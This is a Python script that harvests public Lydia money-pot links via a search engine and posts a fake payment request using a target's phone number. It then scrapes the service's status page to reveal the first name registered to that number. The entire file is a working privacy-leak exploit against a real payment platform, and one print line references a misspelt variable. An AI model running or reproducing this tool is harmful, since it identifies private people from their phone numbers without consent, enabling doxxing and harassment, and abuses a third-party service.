import requests
import re
import time
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init()  # Init colorama for colored text in terminal

dico = []

def proceed(phone_info):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    def find_pots_urls():
        url = "https://search.brave.com/search?q=https%3A%2F%2Fpots.lydia.me%2Fcollect%2Fpots%3Fid%3D&source=web"
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            links = soup.find_all("a", href=True)
            pots_links = [link['href'] for link in links if "/collect/" in link['href']]
            for pot_url in pots_links:
                if not pot_url in dico:
                    print(f"➡️ Testing URL : {pot_url}")
                    pot_response = requests.get(pot_url)
                    if "error?code=" not in pot_response.url:
                        print(f"✅ Valid pot found : {pot_url}")
                        match = re.search(r"/collect/([^/?]+)", pot_url)
                        if match:
                            slug = match.group(1)
                            print(f"🔹 Extracted slug: {slug}\n")
                            dico.append(pot_url)
                            return slug
                    else:
                        print(f"❌ Error with URL : {pot_url}")
        print(repsonse.text)
        print("❌ No pots found")
        return None

    def get_uuid(slug):
        data = {
            "slug": slug,
            "price": "10",
            "customdata[name-key]": "who cares",
            "customdata[amount-key]": "10",
            "customdata[recipient-key]": f"{phone_info}",
            "payment_method": "lydia"
        }

        for attempt in range(3):
            response = requests.post("https://pots.lydia.me/collect/createrequest?", 
                                     headers=headers, data=data, allow_redirects=False)
            if "Location" in response.headers:
                match = re.search(r"/collect/payment/([a-f0-9]{32})/", response.headers["Location"])
                if match:
                    uuid = match.group(1)
                    print(f"✅ UUID retrieved : {uuid}")
                    return uuid
            print(f"❌ No redirection detected (attempt {attempt + 1}/3), retrying...")
            time.sleep(2)
        return None

    def get_first_name(uuid):
        time.sleep(2)
        url_get = f"https://pots.lydia.me/collect/state?uuid={uuid}"
        response_get = requests.get(url_get, headers=headers)
        soup = BeautifulSoup(response_get.text, "html.parser")
        description = soup.find("p", class_="radar-description")
        if description:
            text = description.text.strip()
            if "," in text:
                first_word = text.split(",")[0]
                print(f"✅ First name found : {Fore.YELLOW}{first_word}{Style.RESET_ALL}")
            else:
                print("❌ Not found")
        else:
            print("❌ Not found")


    for outer_attempt in range(3):
        print(f"\n🔄 Attempt {outer_attempt + 1}/3 to get slug & UUID...")
        slug_ID = find_pots_urls()
        if not slug_ID:
            print("⛔ No slug found. Breaking...")
            break

        uuid = get_uuid(slug_ID)
        if uuid:
            get_first_name(uuid)
            break
        else:
            print("❌ UUID not found with this slug, retrying...")
            time.sleep(2)
